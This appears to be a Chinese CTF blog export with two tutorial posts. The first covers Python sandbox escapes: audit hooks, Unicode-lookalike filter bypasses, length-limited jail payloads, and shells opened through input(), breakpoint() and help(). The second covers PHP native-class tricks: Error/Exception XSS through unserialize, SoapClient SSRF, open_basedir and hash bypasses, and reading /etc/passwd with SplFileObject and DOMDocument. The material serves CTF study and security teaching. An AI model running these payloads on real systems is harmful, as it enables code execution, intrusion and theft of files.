<h3 id="钩子爹来咯"><a href="#钩子爹来咯" class="headerlink" title="钩子爹来咯!"></a>钩子爹来咯!</h3><p>钩子是什么?<del>钩子就是钩子啊</del></p>
<blockquote>
<p> <strong>Audit Hook</strong>审计钩子是Python3.8开始引入的一项安全功能旨在让 Python 运行时的操作对外部监控工具可见。该功能允许开发者通过注册钩子函数来监控和控制特定的事件，尤其是与安全相关的操作。这种机制为系统管理员、测试人员和安全专家提供了一个有效的手段来检测、记录或阻止特定操作。</p>
<p>审计钩子通过 <code>sys.addaudithook()</code> 函数添加。每当发生特定事件时，Python会调用这些钩子函数，并将事件名称和相关参数传递给它们。钩子函数可以选择记录这些事件，或者在检测到不允许的操作时抛出异常，从而阻止操作继续进行。</p>
</blockquote>
<p>而发生审计事件时，Python就会调用这些钩子</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li><code>import</code>：发生在导入模块时。</li>
<li><code>open</code>：发生在打开文件时。</li>
<li><code>write</code>：发生在写入文件时。</li>
<li><code>exec</code>：发生在执行Python代码时。</li>
<li><code>compile</code>：发生在编译Python代码时。</li>
<li><code>socket</code>：发生在创建或使用网络套接字时。</li>
<li><code>os.system</code>，<code>os.popen</code>等：发生在执行操作系统命令时。</li>
<li><code>subprocess.Popen</code>，<code>subprocess.run</code>等：发生在启动子进程时</li>
</ul>
<p>所有的事件列表可见：</p>
<ul>
<li><a href="https://docs.python.org/3/library/audit_events.html">Audit events table — Python 3.13.0 documentation</a></li>
<li><a href="https://peps.python.org/pep-0578/">PEP 578 – Python Runtime Audit Hooks</a></li>
</ul>
<h4 id="篡改内置函数"><a href="#篡改内置函数" class="headerlink" title="篡改内置函数"></a>篡改内置函数</h4><h3 id="乱七八糟的WAF"><a href="#乱七八糟的WAF" class="headerlink" title="乱七八糟的WAF"></a>乱七八糟的WAF</h3><h4 id="过滤import"><a href="#过滤import" class="headerlink" title="过滤import"></a>过滤import</h4><p><strong><code>__import__</code></strong></p>
<p>除了可以使用 import，还可以使用 <code>__import__</code>和 <code>importlib.import_module</code>来导入模块<br><code>importlib </code>需要进行导入后才能够使用</p>
<p>还可以使用<code>execfile</code></p>
<pre><code class="highlight python"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)
importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)

<span class="comment">#py2</span>
execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)

<span class="comment">#py3</span>
<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
    <span class="built_in">exec</span>(f.read())
    <span class="comment">#这个是需要事先知道路径的，要用sys.path(if)去事先试探一下</span></code></pre>

<p><strong><code>__loader__</code></strong></p>
<p><code>__loader__.load_module</code>底层实现与 import 不同, 可以绕过audithook</p>
<pre><code class="highlight plaintext">__loader__.load_module(&#x27;os&#x27;)</code></pre>

<h4 id="过滤字母"><a href="#过滤字母" class="headerlink" title="过滤字母"></a>过滤字母</h4><p>可以用全角字符绕过半角字符</p>
<pre><code class="highlight plaintext">def halfwidth_to_fullwidth(text):
    &quot;&quot;&quot;将半角字符转换为全角字符&quot;&quot;&quot;
    result = []
    for char in text:
        code = ord(char)
        if code == 0x20:  # 半角空格 → 全角空格
            result.append(&#x27;\u3000&#x27;)
        elif 0x21 &lt;= code &lt;= 0x7E:  # 可打印ASCII字符 → 全角字符
            result.append(chr(code + 0xFEE0))
        else:  # 其他字符保持不变
            result.append(char)
    return &#x27;&#x27;.join(result)

# 目标字符串
target_string = &quot;eval&quot;

# 转换并直接打印结果
print(halfwidth_to_fullwidth(target_string))</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703093113593.png" alt="image-20250703093113593"></p>
<p>可以看到绕过成功</p>
<p>还有一种方法也可以绕过，利用特殊的Unicode字符</p>
<pre><code class="highlight plaintext">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗
𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 
𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</code></pre>

<pre><code class="highlight plaintext">#coding=utf-8
def convert_to_math_sans_italic(text):
    result = []
    for char in text:
        code = ord(char)
        if 0x30 &lt;= code &lt;= 0x39:
            result.append(chr(code - 0x30 + 0x1D7EC))
        elif 0x61 &lt;= code &lt;= 0x7A:
            result.append(chr(code - 0x61 + 0x1D622))
        elif 0x41 &lt;= code &lt;= 0x5A:
            result.append(chr(code - 0x41 + 0x1D608))
        else:
            result.append(char)
    return &#x27;&#x27;.join(result)

if __name__ == &quot;__main__&quot;:
    original = &quot;eval&quot;
    converted = convert_to_math_sans_italic(original)
    print(&quot;原始字符串:&quot;, original)
    print(&quot;转换结果: &quot;, converted)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094342023.png" alt="image-20250703094342023"></p>
<p>可以看到也绕过成功了</p>
<p>但是要注意的是放在语句中时绝对不能用全角字符作开头，会褒姒</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094649462.png" alt="image-20250703094649462"></p>
<h4 id="过滤属性"><a href="#过滤属性" class="headerlink" title="过滤属性"></a>过滤属性</h4><p>利用一下<code>getattr</code>这个函数</p>
<p>功能其实就是获取类的某个属性值</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; getattr(os,&#x27;system&#x27;)(&#x27;cat /etc/passwd&#x27;)
root:x:0:0:root:/root:/usr/bin/zsh</code></pre>

<p>也可以用<code>__getattribute__</code>方法替换</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; os.__getattribute__(&#x27;system&#x27;)
&lt;built-in function system&gt;</code></pre>

<p>还可以用<code>__getattr</code>__</p>
<pre><code class="highlight plaintext">这是一个魔术方法</code></pre>

<h4 id="行数限制"><a href="#行数限制" class="headerlink" title="行数限制"></a>行数限制</h4><p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用,例如 eval, 中间如果存在；或者换行会报错。</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;__import__(&#x27;os&#x27;);print(1)&quot;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;&lt;string&gt;&quot;, line 1
    __import__(&#x27;os&#x27;);print(1)</code></pre>

<h5 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h5><p>exec 可以支持换行符与<code>;</code></p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;)
1</code></pre>

<h5 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h5><p>compile 在 single 模式下也同样可以使用 \n 进行换行, 在 exec 模式下可以直接执行多行代码.</p>
<pre><code class="highlight plaintext">eval(&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;)</code></pre>

<h5 id="海象表达式"><a href="#海象表达式" class="headerlink" title="海象表达式"></a>海象表达式</h5><p>海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</p>
<p>海象表达式的语法形式如下：</p>
<pre><code class="highlight plaintext">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;</code></pre>

<p>借助海象表达式，我们可以通过列表来替代多行代码：</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;)
uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
[&lt;module &#x27;os&#x27; (frozen)&gt;, 0]</code></pre>

<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>

<p>题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</p>
<pre><code class="highlight plaintext">print(open(bytes([102,108,97,103,46,116,120,116])).read())</code></pre>

<p>函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr(333).</p>
<pre><code class="highlight plaintext"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)
# a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)
# l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)
# g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)
# . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)
# t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)
# x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)

print(open(bytes([ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;),ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)])).read())</code></pre>

<p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;，这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 <code>a(&#39;ō&#39;)</code> 进行替换。这样就可以构造一个满足条件的 payload</p>
<pre><code class="highlight plaintext">exec(&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;)</code></pre>

<p>但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr(4434)</p>
<p>当然，可以直接使用 input 函数来绕过长度限制。</p>
<h5 id="打开-input-输入"><a href="#打开-input-输入" class="headerlink" title="打开 input 输入"></a>打开 input 输入</h5><p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p>
<p>以 BYUCTF2023 jail a-z0-9 为例：</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>

<p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p>
<pre><code class="highlight plaintext">𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())</code></pre>

<p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p>
<pre><code class="highlight plaintext">__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p>
<p>下面是一些打开输入流的方式:</p>
<ul>
<li><strong>sys.stdin.read()</strong></li>
</ul>
<p>注意输入完毕之后按 ctrl+d 结束输入</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.read())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)
kali
0
&gt;&gt;&gt;</code></pre>

<ul>
<li><strong>sys.stdin.readline()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readline())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<ul>
<li><strong>sys.stdin.readlines()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readlines()[0])
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<p>在 python2 中，在python 2中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。</p>
<h5 id="breakpoint-函数"><a href="#breakpoint-函数" class="headerlink" title="breakpoint 函数"></a>breakpoint 函数</h5><p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
--Return--
&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
a-z0-9.py  exp2.py  exp.py  flag.txt
0
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt</code></pre>

<h5 id="help-函数"><a href="#help-函数" class="headerlink" title="help 函数"></a>help 函数</h5><p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p>
<p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助</p>
<pre><code class="highlight plaintext">𝘩𝘦𝘭𝘱()</code></pre>

<p>然后输入 os,此时会进入 os 的帮助文档。</p>
<pre><code class="highlight plaintext">help&gt; os</code></pre>

<p>然后在输入 <code>!sh</code> 就可以拿到 &#x2F;bin&#x2F;sh, 输入 <code>!bash</code> 则可以拿到 &#x2F;bin&#x2F;bash</p>
<pre><code class="highlight plaintext">help&gt; os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$</code></pre>



<h2 id="vm2逃逸"><a href="#vm2逃逸" class="headerlink" title="vm2逃逸"></a>vm2逃逸</h2>]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>磨好的利剑:PHP原生类</title>
    <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p>相当综合的应用呢，利用面广的不行，爽赤</p>
<p>常见的原生类有以下几个</p>
<pre><code class="highlight plaintext">1.Error/Exception
2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator
3.SoapClient
4.SimpleXMLElement</code></pre>

<p>当然还有有些偶尔能用上的<code>ZipArchive</code></p>
<h2 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h2><h3 id="Error-Exception内置类"><a href="#Error-Exception内置类" class="headerlink" title="Error&#x2F;Exception内置类"></a>Error&#x2F;Exception内置类</h3><p><strong>Error</strong>:</p>
<ul>
<li>仅适用于PHP7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>我们可以查看一下Error的内置方法</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$className</span> = <span class="string">&#x27;Error&#x27;</span>;

<span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$className</span>);

<span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;
    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$className&#125;</span>::<span class="subst">&#123;$method&#125;</span>&quot;</span> . PHP_EOL;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>得到:</p>
<pre><code class="highlight plaintext">Error::__construct
Error::__wakeup
Error::getMessage
Error::getCode
Error::getFile
Error::getLine
Error::getTrace
Error::getPrevious
Error::getTraceAsString
Error::__toString</code></pre>

<p>那么就可以利用XSS的<code>__toString</code>魔术方法打一个XSS</p>
<p>测试代码:</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="meta">?&gt;</span></code></pre>

<p>(如果不知道原生类的情况下可能直接趋势了吧</p>
<p>那么就用Error类构造一个POC</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);
<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  
<span class="meta">?&gt;</span>
<span class="comment">//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A44%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png" alt="image-20250701145615605"></p>
<p>可以看到成功弹出</p>
<p><code>Exception</code>也是同理的</p>
<p>得到</p>
<pre><code class="highlight plaintext">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A46%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Cmethod.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png" alt="image-20250701150814244"></p>
<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><p>用Soap之前先要在php.ini里开一下extension</p>
<p>这里只提供一下PHP8的配置方法，因为7和以上的版本配置的内容是不一样的</p>
<p>先把路径改一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png" alt="image-20250701160148997"></p>
<p>这里初始是<code>ext</code>，需要改掉并且去掉前面的;</p>
<p>再找到<code>soap</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png" alt="image-20250701160246768"></p>
<p>这边也需要去掉前面的;</p>
<p>这样就算配好了。</p>
<h3 id="SoapClient何许人也"><a href="#SoapClient何许人也" class="headerlink" title="SoapClient何许人也?"></a>SoapClient何许人也?</h3><p>PHP 的内置类<code> SoapClient</code> 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
<p>类摘要如下：</p>
<pre><code class="highlight plaintext">SoapClient &#123;
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = &quot;&quot; ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed
&#125;</code></pre>

<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 <code>SoapClient</code> 类可以被我们运用在 SSRF 中。<code>SoapClient</code> 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<pre><code class="highlight plaintext">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre>

<ul>
<li>第一个参数是用来指明是否是<code>wsdl</code>模式，将该值设为null则表示非<code>wsdl</code>模式。</li>
<li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置location和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</li>
</ul>
<p>在知道两个选项的含义之后payload就相当容易构造了</p>
<p><strong>设置第一个参数为null，第二个为<code>target_url</code></strong></p>
<p>这里其实就可以配合<strong>CRLF</strong>或者<strong>HTTP请求走私</strong>搞一下</p>
<h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a><code>open_basedir</code>绕过</h2><p><code>DirectoryIterator</code>与glob:&#x2F;&#x2F;协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
<h2 id="哈希比较绕过"><a href="#哈希比较绕过" class="headerlink" title="哈希比较绕过"></a>哈希比较绕过</h2><p><code>Error</code>类是所有php内部错误类的基类 从php7开始被引入</p>
<p><code>Exception</code>类是所有异常的类，从php5开始被引入</p>
<p>这两个都存在<code>__tostring</code>方法</p>
<p>通过echo&#x2F;return就可以直接触发</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//注意这是同一行</span>
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
&#123;
	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
&#125;
<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出是true</span>
<span class="meta">?&gt;</span></code></pre>

<p>但是如果这样写</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);
<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//这里不是同一行</span>
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
&#123;
	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
&#125;
<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出的是false</span>
<span class="meta">?&gt;</span></code></pre>

<p>这是为什么呢(雾)，看一眼输出就可以发现它的返回值是带有行数的，这个就会导致哈希值不一样</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250711143413796.png" alt="image-20250711143413796"></p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7</p>
<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><code>SplFileObject</code></h3><p>这个是按行读取的，如果多行读取就需要遍历了</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);
<span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;
    <span class="keyword">echo</span>(<span class="variable">$f</span>);
&#125;
<span class="comment">// 或者用伪协议base64直接输出，有时候有奇效</span>
<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/etc/passwd&#x27;</span>);
<span class="keyword">echo</span> <span class="variable">$context</span>;</code></pre>

<p>写:</p>
<pre><code class="highlight plaintext">$f = new SplFileObject(&#x27;./file&#x27;, &quot;w&quot;);
$f-&gt;fwrite(&quot;file&quot;);</code></pre>

<h3 id="DOMDocumnet"><a href="#DOMDocumnet" class="headerlink" title="DOMDocumnet"></a>DOMDocumnet</h3><p>这个类本意是处理 XML 和 HTML 内容，不过也有相应的读&#x2F;写文件的方法，只要利用 伪协议 稍做加工就可以无杂质地对数据进行操作。</p>
<p>读文件:</p>
<pre><code class="highlight php"><span class="comment"># 读文件</span>
<span class="comment"># 先用 convert.base64 将文件内容base64，避免出现额外的 &lt;p&gt; 标签</span>
<span class="comment"># 然后将读取的内容转换成 XML 格式，再加载它，最后取 &lt;p&gt; 标签内的内容 (如果想获取纯净流则可以再进行base64解码)</span>
<span class="variable">$f</span>=<span class="string">&quot;/etc/passwd&quot;</span>;
<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=<span class="subst">$f</span>&quot;</span>);
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveXML</span>());
<span class="keyword">echo</span> <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>]-&gt;textContent;</code></pre>

<p>写文件</p>
<pre><code class="highlight php"><span class="comment"># 写文件</span>
<span class="comment"># 先用 string.strip_tags 将多余的 HTML 标签去掉，然后再用 convert.base64 将多余的其他杂质 (如空格，双引号等非base64字符去掉)</span>
<span class="variable">$f</span>=<span class="string">&quot;./test.php&quot;</span>;
<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTML</span>(<span class="string">&quot;dGVzdA==&quot;</span>);
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveHtmlFile</span>(<span class="string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=<span class="subst">$f</span>&quot;</span>);</code></pre>

<p>读文件：<code>Xinclude</code></p>
<pre><code class="highlight plaintext">&lt;?php $a = filter_input(1,&quot;file&quot;);; $xml = &lt;&lt;&lt;EOD &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;$a&quot; parse=&quot;text&quot;/&gt; &lt;/root&gt; EOD; $dom = new DOMDocument; $dom-&gt;preserveWhiteSpace = false; $dom-&gt;formatOutput = true; $dom-&gt;loadXML($xml); $dom-&gt;xinclude(); echo $dom-&gt;saveXML();</code></pre>

